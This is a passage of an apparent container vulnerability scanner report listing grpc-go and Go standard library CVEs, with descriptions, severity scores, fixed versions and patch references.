                        │      │                            9afbb07074e22b1af86c 
                        │      ├ SeveritySource  : ghsa 
                        │      ├ PrimaryURL      : https://github.com/advisories/GHSA-hrxh-6v49-42gf 
                        │      ├ DataSource       ╭ ID  : ghsa 
                        │      │                  ├ Name: GitHub Security Advisory Go 
                        │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+e
                        │      │                          cosystem%3Ago 
                        │      ├ Fingerprint     : sha256:48ea26539d9019b5ef6008db9822ac0f9bddd437976566f80fae7
                        │      │                   f5c9c337364 
                        │      ├ Title           : gRPC-Go: xDS RBAC and HTTP/2 Vulnerabilities 
                        │      ├ Description     : Multiple security vulnerabilities have been identified and
                        │      │                   addressed in grpc-go affecting the xDS RBAC authorization
                        │      │                   engine (internal/xds/rbac) and the HTTP/2 transport server
                        │      │                   implementation (internal/transport). These vulnerabilities
                        │      │                   could result in:
                        │      │                   
                        │      │                   - Authorization Bypass (Fail-Open) when translating xDS RBAC
                        │      │                    policies containing `Metadata` or `RequestedServerName`
                        │      │                   fields.
                        │      │                   - Denial of Service (High CPU Consumption) due to an HTTP/2
                        │      │                   Rapid Reset mitigation bypass during client-initiated stream
                        │      │                    resets.
                        │      │                   - Denial of Service (Server Panic) when parsing crafted xDS
                        │      │                   RBAC policies containing `NOT` rules around unsupported
                        │      │                   ### Impact
                        │      │                   _What kind of vulnerability is it? Who is impacted?_
                        │      │                   #### xDS RBAC Authorization Bypass via `Metadata` &
                        │      │                   `RequestedServerName` matchers
                        │      │                   - Affected Component: xDS RBAC 
                        │      │                   - Impact: When building policy matchers for gRPC RBAC from
                        │      │                   xDS configurations, unsupported `permission` and `principal`
                        │      │                    rules (specifically `Metadata` and `RequestedServerName`)
                        │      │                   were silently ignored and treated as no-ops.
                        │      │                     - If an authorization policy relied purely on these
                        │      │                   matchers for access control, treating those rules as no-ops
                        │      │                   effectively removed the restrictions.
                        │      │                   - If these unsupported rules were nested inside logical
                        │      │                   `NOT` rules (`Permission_NotRule` / `Principal_NotId`) or
                        │      │                   multi-condition `OR/AND` rules, silently dropping them
                        │      │                   changed the boolean logic flow of the authorization engine.
                        │      │                   As a result, policy evaluation decisions could fail open,
                        │      │                   allowing unauthorized clients to access protected gRPC
                        │      │                   services or resources.
                        │      │                   #### HTTP/2 Rapid Reset Mitigation Bypass / Denial of
                        │      │                   Service via Stream Aborts
                        │      │                   - Affected Component: HTTP/2 transport
                        │      │                   - Impact: Earlier mitigations in grpc-go for HTTP/2 Rapid
                        │      │                   Reset only applied threshold checks to items that directly
                        │      │                   resulted in control frames being written back to the wire,
                        │      │                   such as `SETTINGS` ACKs or server-initiated `RST_STREAM`s.
                        │      │                   When a client initiated a rapid flood of stream creation
                        │      │                   (`HEADERS`) immediately followed by stream termination
                        │      │                   `RST_STREAM`, items queued up in the control buffer without
                        │      │                   counting against the transport response frame threshold. An
                        │      │                   attacker can repeatedly trigger this flood sequence to
                        │      │                   bypass reader blocking, resulting in high CPU usage, and
                        │      │                   Denial of Service (DoS).
                        │      │                   #### Denial of Service (Panic) in xDS RBAC Engine via
                        │      │                   Unsupported Fields inside NOT Rules
                        │      │                   - Impact: The xDS RBAC policy translators recursively
                        │      │                   generate matchers for nested rules. When a `NOT` rule
                        │      │                   wrapped an unsupported or unhandled field (such as
                        │      │                   `SourcedMetadata`), the recursive step returned an empty
                        │      │                   matcher. This could result in a runtime panic when the RBAC
                        │      │                   engine attempts to authorize an incoming request.
                        │      │                   An attacker or misconfigured/malicious xDS management server
                        │      │                    delivering an LDS/RDS update containing a `NOT` rule around
                        │      │                    an unhandled field causes the gRPC server process to crash
                        │      │                   immediately (CWE-248 / Denial of Service).
                        │      │                   ### Patches
                        │      │                   _Has the problem been patched? What versions should users
                        │      │                   upgrade to?_
                        │      │                   All three issues have been fixed in `master` and will be
                        │      │                   released in 1.82.1 shortly.
                        │      │                   ### Workarounds
                        │      │                   _Is there a way for users to fix or remediate the
                        │      │                   vulnerability without upgrading?_
                        │      │                   If upgrading grpc-go immediately is not possible, apply the
                        │      │                   following workarounds based on your deployment
                        │      │                   architecture:
                        │      │                   * For xDS RBAC Vulnerabilities & Panics: Ensure that
                        │      │                   upstream xDS management servers do not push RBAC policies
                        │      │                   containing `Metadata`, `RequestedServerName`, or `NOT` rules
                        │      │                    wrapping unsupported fields (such as `SourcedMetadata`) to
                        │      │                   grpc-go servers.
                        │      │                   * For HTTP/2 Rapid Reset DOS: Configure upstream reverse
                        │      │                   proxies or load balancers (such as Envoy) with strict HTTP/2
                        │      │                    `max_concurrent_streams` limits and active rate limiting on
                        │      │                    `RST_STREAM` frequency per connection.
                        │      │                   ### Severity
                        │      │                     | Vulnerability | Qualitative Severity | Approximate CVSS
                        │      │                   v3.1 Score | Primary Impact |
                        │      │                     | :--- | :--- | :--- | :--- |
                        │      │                     | **xDS RBAC Authorization Bypass** | **High** | `8.2` |
                        │      │                   Unauthorized Access / Fail-Open |
                        │      │                     | **HTTP/2 Rapid Reset DOS Bypass** | **High** | `7.5` |
                        │      │                   High CPU Consumption / Denial of Service |
                        │      │                     | **xDS RBAC Engine Server Panic** | **Medium** | `5.9` |
                        │      │                   Process Crash / Denial of Service | 
                        │      ├ Severity        : HIGH 
                        │      ├ VendorSeverity   ─ ghsa: 3 
                        │      ├ CVSS             ─ ghsa ╭ V40Vector: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI
                        │      │                         │            :H/VA:H/SC:N/SI:N/SA:N 
                        │      │                         ╰ V40Score : 8.8 
                        │      ├ References       ╭ [0]: https://github.com/grpc/grpc-go 
                        │      │                  ├ [1]: https://github.com/grpc/grpc-go/commit/4ea465d4ab98013
                        │      │                  │      f72a142fe0fc89c19770b2935 
                        │      │                  ├ [2]: https://github.com/grpc/grpc-go/pull/9236 
                        │      │                  ├ [3]: https://github.com/grpc/grpc-go/releases/tag/v1.82.1 
                        │      │                  ╰ [4]: https://github.com/grpc/grpc-go/security/advisories/GH
                        │      │                         SA-hrxh-6v49-42gf 
                        │      ├ PublishedDate   : 2026-07-21T22:03:55Z 
                        │      ╰ LastModifiedDate: 2026-07-21T22:03:56Z 
                        ├ [11] ╭ VulnerabilityID : CVE-2026-27145 
                        │      ├ VendorIDs        ─ [0]: GO-2026-5037 
                        │      ├ PkgID           : stdlib@v1.26.3 
                        │      ├ PkgName         : stdlib 
                        │      ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.26.3 
                        │      │                  ╰ UID : 9770e92adf1be71b 
                        │      ├ InstalledVersion: v1.26.3 
                        │      ├ FixedVersion    : 1.25.11, 1.26.4 
                        │      ├ Status          : fixed 
                        │      ├ Layer            ╭ Digest: sha256:604c1010afb5bf9e9e06c9e56ce6d5158b10aded2bdb
                        │      │                  │         e92562dadc4ee6c7523d 
                        │      │                  ╰ DiffID: sha256:84b651ec5f5694c97a88671f0f61cc76ca224ce8707d
                        │      │                            9afbb07074e22b1af86c 
                        │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-27145 
                        │      ├ DataSource       ╭ ID  : govulndb 
                        │      │                  ├ Name: The Go Vulnerability Database 
                        │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
                        │      ├ Fingerprint     : sha256:8800f7857f672787e0016a896b2fe4a77475769bf9e4c70846474
                        │      │                   c8917275b4b 
                        │      ├ Title           : crypto/x509: golang: golang crypto/x509: Denial of Service
                        │      │                   via excessive processing of DNS SAN entries 
                        │      ├ Description     : (*x509.Certificate).VerifyHostname previously called
                        │      │                   matchHostnames in a loop over all DNS Subject Alternative
                        │      │                   Name (SAN) entries. This caused strings.Split(host, ".") to
                        │      │                   execute repeatedly on the same input hostname. With a large
                        │      │                   DNS SAN list, verification costs scaled quadratically based
                        │      │                   on the number of SAN entries multiplied by the hostname's
                        │      │                   label count. Because x509.Verify validates hostnames before
                        │      │                   building the certificate chain, this overhead occurred even
                        │      │                   for untrusted certificates. 
                        │      ├ Severity        : HIGH 
                        │      ├ CweIDs           ─ [0]: CWE-606 
                        │      ├ VendorSeverity   ╭ alma       : 3 
                        │      │                  ├ amazon     : 2 
                        │      │                  ├ bitnami    : 2 
                        │      │                  ├ oracle-oval: 3 
                        │      │                  ├ redhat     : 3 
                        │      │                  ╰ rocky      : 3 
                        │      ├ CVSS             ╭ bitnami ╭ V3Vector: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:
                        │      │                  │         │           L/A:H 
                        │      │                  │         ╰ V3Score : 6.5 
                        │      │                  ╰ redhat  ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:
                        │      │                            │           N/A:H 
                        │      │                            ╰ V3Score : 7.5 
                        │      ├ References       ╭ [0] : https://access.redhat.com/errata/RHSA-2026:23262 
                        │      │                  ├ [1] : https://access.redhat.com/errata/RHSA-2026:23264 
                        │      │                  ├ [2] : https://access.redhat.com/errata/RHSA-2026:29980 
                        │      │                  ├ [3] : https://access.redhat.com/errata/RHSA-2026:29981 
                        │      │                  ├ [4] : https://access.redhat.com/errata/RHSA-2026:33574 
                        │      │                  ├ [5] : https://access.redhat.com/errata/RHSA-2026:34357 
                        │      │                  ├ [6] : https://access.redhat.com/errata/RHSA-2026:34359 
                        │      │                  ├ [7] : https://access.redhat.com/errata/RHSA-2026:35832 
                        │      │                  ├ [8] : https://access.redhat.com/errata/RHSA-2026:36317 
                        │      │                  ├ [9] : https://access.redhat.com/errata/RHSA-2026:36648 
                        │      │                  ├ [10]: https://access.redhat.com/errata/RHSA-2026:36797 
                        │      │                  ├ [11]: https://access.redhat.com/errata/RHSA-2026:38995 
                        │      │                  ├ [12]: https://access.redhat.com/errata/RHSA-2026:39005 
                        │      │                  ├ [13]: https://access.redhat.com/errata/RHSA-2026:39573 
                        │      │                  ├ [14]: https://access.redhat.com/errata/RHSA-2026:39879 
                        │      │                  ├ [15]: https://access.redhat.com/errata/RHSA-2026:41030 
                        │      │                  ├ [16]: https://access.redhat.com/errata/RHSA-2026:41036 
                        │      │                  ├ [17]: https://access.redhat.com/errata/RHSA-2026:41930 
                        │      │                  ├ [18]: https://access.redhat.com/errata/RHSA-2026:42043 
                        │      │                  ├ [19]: https://access.redhat.com/errata/RHSA-2026:42047 
                        │      │                  ├ [20]: https://access.redhat.com/errata/RHSA-2026:42049 
                        │      │                  ├ [21]: https://access.redhat.com/errata/RHSA-2026:42050 
                        │      │                  ├ [22]: https://access.redhat.com/errata/RHSA-2026:42051 
                        │      │                  ├ [23]: https://access.redhat.com/errata/RHSA-2026:42079 
                        │      │                  ├ [24]: https://access.redhat.com/errata/RHSA-2026:42080 
                        │      │                  ├ [25]: https://access.redhat.com/errata/RHSA-2026:42082 
                        │      │                  ├ [26]: https://access.redhat.com/errata/RHSA-2026:42142 
                        │      │                  ├ [27]: https://access.redhat.com/errata/RHSA-2026:42150 
                        │      │                  ├ [28]: https://access.redhat.com/errata/RHSA-2026:42151 
                        │      │                  ├ [29]: https://access.redhat.com/errata/RHSA-2026:42240 
                        │      │                  ├ [30]: https://access.redhat.com/errata/RHSA-2026:42644 
                        │      │                  ├ [31]: https://access.redhat.com/errata/RHSA-2026:42946 
                        │      │                  ├ [32]: https://access.redhat.com/errata/RHSA-2026:44622 
                        │      │                  ├ [33]: https://access.redhat.com/errata/RHSA-2026:46394 
                        │      │                  ├ [34]: https://access.redhat.com/errata/RHSA-2026:46395 
                        │      │                  ├ [35]: https://access.redhat.com/errata/RHSA-2026:47149 
                        │      │                  ├ [36]: https://access.redhat.com/errata/RHSA-2026:47735 
                        │      │                  ├ [37]: https://access.redhat.com/errata/RHSA-2026:47737 
                        │      │                  ├ [38]: https://access.redhat.com/security/cve/CVE-2026-27145 
                        │      │                  ├ [39]: https://bugzilla.redhat.com/2445356 
                        │      │                  ├ [40]: https://bugzilla.redhat.com/2484207 
                        │      │                  ├ [41]: https://bugzilla.redhat.com/show_bug.cgi?id=2445356 
                        │      │                  ├ [42]: https://bugzilla.redhat.com/show_bug.cgi?id=2484207 
                        │      │                  ├ [43]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
                        │      │                  │       26-25679 
                        │      │                  ├ [44]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
                        │      │                  │       26-27145 
                        │      │                  ├ [45]: https://errata.almalinux.org/9/ALSA-2026-36317.html 
                        │      │                  ├ [46]: https://errata.rockylinux.org/RLSA-2026:36317 
                        │      │                  ├ [47]: https://go.dev/cl/783621 
                        │      │                  ├ [48]: https://go.dev/issue/79694 
                        │      │                  ├ [49]: https://groups.google.com/g/golang-announce/c/tKs3rmc
                        │      │                  │       BcKw 
                        │      │                  ├ [50]: https://linux.oracle.com/cve/CVE-2026-27145.html 
                        │      │                  ├ [51]: https://linux.oracle.com/errata/ELSA-2026-46395.html 
                        │      │                  ├ [52]: https://nvd.nist.gov/vuln/detail/CVE-2026-27145 
                        │      │                  ├ [53]: https://pkg.go.dev/vuln/GO-2026-5037 
                        │      │                  ├ [54]: https://security.access.redhat.com/data/csaf/v2/vex/2
                        │      │                  │       026/cve-2026-27145.json 
                        │      │                  ╰ [55]: https://www.cve.org/CVERecord?id=CVE-2026-27145 
                        │      ├ PublishedDate   : 2026-06-02T23:16:35.57Z 
                        │      ╰ LastModifiedDate: 2026-07-31T13:17:40.873Z 
                        ├ [12] ╭ VulnerabilityID : CVE-2026-39822 
                        │      ├ VendorIDs        ─ [0]: GO-2026-4970 
                        │      ├ PkgID           : stdlib@v1.26.3 
                        │      ├ PkgName         : stdlib 
                        │      ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.26.3 
                        │      │                  ╰ UID : 9770e92adf1be71b 
                        │      ├ InstalledVersion: v1.26.3 
                        │      ├ FixedVersion    : 1.25.12, 1.26.5, 1.27.0-rc.2 
                        │      ├ Status          : fixed 
                        │      ├ Layer            ╭ Digest: sha256:604c1010afb5bf9e9e06c9e56ce6d5158b10aded2bdb
                        │      │                  │         e92562dadc4ee6c7523d 
                        │      │                  ╰ DiffID: sha256:84b651ec5f5694c97a88671f0f61cc76ca224ce8707d
                        │      │                            9afbb07074e22b1af86c 
                        │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-39822 
                        │      ├ DataSource       ╭ ID  : govulndb 
                        │      │                  ├ Name: The Go Vulnerability Database 
                        │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
                        │      ├ Fingerprint     : sha256:0a25836d79cd84081036f94712e40beedd78fa20ccd958ac1038e
                        │      │                   5a96cca8dcf 
                        │      ├ Title           : os: golang: Go os.Root: Symlink following vulnerability
                        │      │                   allows directory traversal 
                        │      ├ Description     : On Unix systems, opening a file in an os.Root improperly
                        │      │                   follows symlinks to locations outside of the Root when the
                        │      │                   final path component of the a path is a symbolic link and
                        │      │                   the path ends in /. For example, 'root.Open("symlink/")'
                        │      │                   will open "symlink" even when "symlink" is a symbolic link
                        │      │                   pointing outside of the root. 
                        │      ├ Severity        : HIGH 
                        │      ├ CweIDs           ─ [0]: CWE-61 
                        │      ├ VendorSeverity   ╭ alma       : 3 
                        │      │                  ├ amazon     : 2 
                        │      │                  ├ bitnami    : 3 
                        │      │                  ├ oracle-oval: 3 
                        │      │                  ├ redhat     : 3 
                        │      │                  ╰ rocky      : 3 
                        │      ├ CVSS             ╭ bitnami ╭ V3Vector: CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:
                        │      │                  │         │           H/A:H 
                        │      │                  │         ╰ V3Score : 7.8 
                        │      │                  ╰ redhat  ╭ V3Vector: CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:
                        │      │                            │           H/A:H 
                        │      │                            ╰ V3Score : 7.8 
                        │      ├ References       ╭ [0] : https://access.redhat.com/errata/RHSA-2026:38878 
                        │      │                  ├ [1] : https://access.redhat.com/security/cve/CVE-2026-39822 
                        │      │                  ├ [2] : https://bugzilla.redhat.com/2498152 
                        │      │                  ├ [3] : https://bugzilla.redhat.com/show_bug.cgi?id=2498152 
                        │      │                  ├ [4] : https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
                        │      │                  │       26-39822 
                        │      │                  ├ [5] : https://errata.almalinux.org/9/ALSA-2026-38878.html 
                        │      │                  ├ [6] : https://errata.rockylinux.org/RLSA-2026:38878 
                        │      │                  ├ [7] : https://go.dev/cl/797880 
                        │      │                  ├ [8] : https://go.dev/issue/79005 
                        │      │                  ├ [9] : https://groups.google.com/g/golang-announce/c/OrmQE_Y
                        │      │                  │       p5Sc 
                        │      │                  ├ [10]: https://linux.oracle.com/cve/CVE-2026-39822.html 
                        │      │                  ├ [11]: https://linux.oracle.com/errata/ELSA-2026-38995.html 
                        │      │                  ├ [12]: https://nvd.nist.gov/vuln/detail/CVE-2026-39822 
                        │      │                  ├ [13]: https://pkg.go.dev/vuln/GO-2026-4970 
                        │      │                  ╰ [14]: https://www.cve.org/CVERecord?id=CVE-2026-39822 
                        │      ├ PublishedDate   : 2026-07-08T17:17:21.31Z 
                        │      ╰ LastModifiedDate: 2026-07-13T14:54:26.317Z 
                        ├ [13] ╭ VulnerabilityID : CVE-2026-42504 
                        │      ├ VendorIDs        ─ [0]: GO-2026-5038 
                        │      ├ PkgID           : stdlib@v1.26.3 
                        │      ├ PkgName         : stdlib 
                        │      ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.26.3 
                        │      │                  ╰ UID : 9770e92adf1be71b 
                        │      ├ InstalledVersion: v1.26.3 
                        │      ├ FixedVersion    : 1.25.11, 1.26.4 
                        │      ├ Status          : fixed 
                        │      ├ Layer            ╭ Digest: sha256:604c1010afb5bf9e9e06c9e56ce6d5158b10aded2bdb
                        │      │                  │         e92562dadc4ee6c7523d 
                        │      │                  ╰ DiffID: sha256:84b651ec5f5694c97a88671f0f61cc76ca224ce8707d
                        │      │                            9afbb07074e22b1af86c 
                        │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-42504 
                        │      ├ DataSource       ╭ ID  : govulndb 
                        │      │                  ├ Name: The Go Vulnerability Database 
                        │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
                        │      ├ Fingerprint     : sha256:7780b7d55746ee7d5df7e2007f7ee13b63b8358f89ae1041314ac
                        │      │                   b3fc292f32b 
                        │      ├ Title           : mime: golang: Golang MIME: Denial of Service via
                        │      │                   maliciously-crafted MIME header 
                        │      ├ Description     : Decoding a maliciously-crafted MIME header containing many
                        │      │                   invalid encoded-words can consume excessive CPU. 
                        │      ├ Severity        : HIGH 
                        │      ├ CweIDs           ─ [0]: CWE-407 
                        │      ├ VendorSeverity   ╭ amazon : 2 
                        │      │                  ├ azure  : 3 
                        │      │                  ├ bitnami: 3 
                        │      │                  ╰ redhat : 3 
                        │      ├ CVSS             ╭ bitnami ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:
                        │      │                  │         │           N/A:H 
                        │      │                  │         ╰ V3Score : 7.5 
                        │      │                  ╰ redhat  ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:
                        │      │                            │           N/A:H 
                        │      │                            ╰ V3Score : 7.5 
                        │      ├ References       ╭ [0]: https://access.redhat.com/security/cve/CVE-2026-42504 
                        │      │                  ├ [1]: https://go.dev/cl/774481 
                        │      │                  ├ [2]: https://go.dev/issue/79217 
                        │      │                  ├ [3]: https://groups.google.com/g/golang-announce/c/tKs3rmcB
                        │      │                  │      cKw 
                        │      │                  ├ [4]: https://nvd.nist.gov/vuln/detail/CVE-2026-42504 
                        │      │                  ├ [5]: https://pkg.go.dev/vuln/GO-2026-5038 
                        │      │                  ╰ [6]: https://www.cve.org/CVERecord?id=CVE-2026-42504 
                        │      ├ PublishedDate   : 2026-06-02T23:16:37.927Z 
                        │      ╰ LastModifiedDate: 2026-07-22T19:10:00.12Z 
                        ├ [14] ╭ VulnerabilityID : CVE-2026-42505 
                        │      ├ VendorIDs        ─ [0]: GO-2026-5856 
                        │      ├ PkgID           : stdlib@v1.26.3 
                        │      ├ PkgName         : stdlib 
                        │      ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.26.3 
                        │      │                  ╰ UID : 9770e92adf1be71b 
                        │      ├ InstalledVersion: v1.26.3 
                        │      ├ FixedVersion    : 1.25.12, 1.26.5, 1.27.0-rc.2 
                        │      ├ Status          : fixed 
                        │      ├ Layer            ╭ Digest: sha256:604c1010afb5bf9e9e06c9e56ce6d5158b10aded2bdb
                        │      │                  │         e92562dadc4ee6c7523d 
                        │      │                  ╰ DiffID: sha256:84b651ec5f5694c97a88671f0f61cc76ca224ce8707d
                        │      │                            9afbb07074e22b1af86c 
                        │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-42505 
                        │      ├ DataSource       ╭ ID  : govulndb 
                        │      │                  ├ Name: The Go Vulnerability Database 
                        │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
                        │      ├ Fingerprint     : sha256:7d0713a09e574f5dde545da77a7734fee21a1bf73d92fb284199b
                        │      │                   764a75d0da6 
                        │      ├ Title           : crypto/tls: golang: Go crypto/tls: Information disclosure in
                        │      │                    Encrypted Client Hello 
                        │      ├ Description     : Handshakes which used Encrypted Client Hello could be
                        │      │                   de-anonymized by a passive network observer due to a
                        │      │                   disclosure of pre-shared key identities in the unencrypted
                        │      │                   client hello. 
                        │      ├ Severity        : MEDIUM 
                        │      ├ CweIDs           ─ [0]: CWE-201 
                        │      ├ VendorSeverity   ╭ amazon : 2 
                        │      │                  ├ bitnami: 2 
                        │      │                  ╰ redhat : 2 
                        │      ├ CVSS             ╭ bitnami ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:
                        │      │                  │         │           N/A:N 
                        │      │                  │         ╰ V3Score : 5.3 
                        │      │                  ╰ redhat  ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:
                        │      │                            │           N/A:N 
                        │      │                            ╰ V3Score : 5.3 
                        │      ├ References       ╭ [0]: https://access.redhat.com/security/cve/CVE-2026-42505 
                        │      │                  ├ [1]: https://go.dev/cl/775960 
                        │      │                  ├ [2]: https://go.dev/issue/79282 
                        │      │                  ├ [3]: https://groups.google.com/g/golang-announce/c/OrmQE_Yp
                        │      │                  │      5Sc 
                        │      │                  ├ [4]: https://nvd.nist.gov/vuln/detail/CVE-2026-42505 
                        │      │                  ├ [5]: https://pkg.go.dev/vuln/GO-2026-5856 
                        │      │                  ╰ [6]: https://www.cve.org/CVERecord?id=CVE-2026-42505 
                        │      ├ PublishedDate   : 2026-07-08T17:17:21.497Z 
                        │      ╰ LastModifiedDate: 2026-07-13T17:05:36.303Z 
                        ╰ [15] ╭ VulnerabilityID : CVE-2026-42507 
                               ├ VendorIDs        ─ [0]: GO-2026-5039 
                               ├ PkgID           : stdlib@v1.26.3 
                               ├ PkgName         : stdlib 
                               ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.26.3 
                               │                  ╰ UID : 9770e92adf1be71b 
                               ├ InstalledVersion: v1.26.3 
                               ├ FixedVersion    : 1.25.11, 1.26.4 
                               ├ Status          : fixed 
                               ├ Layer            ╭ Digest: sha256:604c1010afb5bf9e9e06c9e56ce6d5158b10aded2bdb
                               │                  │         e92562dadc4ee6c7523d 
                               │                  ╰ DiffID: sha256:84b651ec5f5694c97a88671f0f61cc76ca224ce8707d
                               │                            9afbb07074e22b1af86c 
                               ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-42507 
                               ├ DataSource       ╭ ID  : govulndb 
                               │                  ├ Name: The Go Vulnerability Database 
                               │                  ╰ URL : https://pkg.go.dev/vuln/ 
                               ├ Fingerprint     : sha256:80615a37d4d81c30eebd05d6c67792a8f1cb97f405aaedfe0227e
                               │                   33737d67717 
                               ├ Title           : net/textproto: golang: Golang net/textproto: Misleading
                               │                   error messages via input injection 
                               ├ Description     : When returning errors, functions in the net/textproto
                               │                   package would include its input as part of the error. This
                               │                   might allow an attacker to inject misleading content to
                               │                   errors that are printed or logged. 
                               ├ Severity        : MEDIUM 
                               ├ VendorSeverity   ╭ alma       : 2 
                               │                  ├ amazon     : 2 
                               │                  ├ bitnami    : 2 
                               │                  ├ oracle-oval: 2 
                               │                  ├ redhat     : 2 
                               │                  ╰ rocky      : 2 
                               ├ CVSS             ╭ bitnami ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:
                               │                  │         │           L/A:N 
                               │                  │         ╰ V3Score : 5.3 
                               │                  ╰ redhat  ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:
                               │                            │           L/A:N 
                               │                            ╰ V3Score : 5.3 
                               ├ References       ╭ [0] : https://access.redhat.com/errata/RHSA-2026:29981 
                               │                  ├ [1] : https://access.redhat.com/security/cve/CVE-2026-42507 
                               │                  ├ [2] : https://bugzilla.redhat.com/2484205 
                               │                  ├ [3] : https://bugzilla.redhat.com/show_bug.cgi?id=2484205 
                               │                  ├ [4] : https://bugzilla.redhat.com/show_bug.cgi?id=2484207 
                               │                  ├ [5] : https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
                               │                  │       26-27145 
                               │                  ├ [6] : https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
                               │                  │       26-42507 
                               │                  ├ [7] : https://errata.almalinux.org/9/ALSA-2026-29981.html 
                               │                  ├ [8] : https://errata.rockylinux.org/RLSA-2026:29981 
                               │                  ├ [9] : https://go.dev/cl/777060 
                               │                  ├ [10]: https://go.dev/issue/79346 
                               │                  ├ [11]: https://groups.google.com/g/golang-announce/c/tKs3rmc
                               │                  │       BcKw 
                               │                  ├ [12]: https://linux.oracle.com/cve/CVE-2026-42507.html 
                               │                  ├ [13]: https://linux.oracle.com/errata/ELSA-2026-29981.html 
                               │                  ├ [14]: https://nvd.nist.gov/vuln/detail/CVE-2026-42507 
                               │                  ├ [15]: https://pkg.go.dev/vuln/GO-2026-5039 
                               │                  ╰ [16]: https://www.cve.org/CVERecord?id=CVE-2026-42507 
                               ├ PublishedDate   : 2026-06-02T23:16:38.027Z 
                               ╰ LastModifiedDate: 2026-07-22T19:10:00.12Z 
```
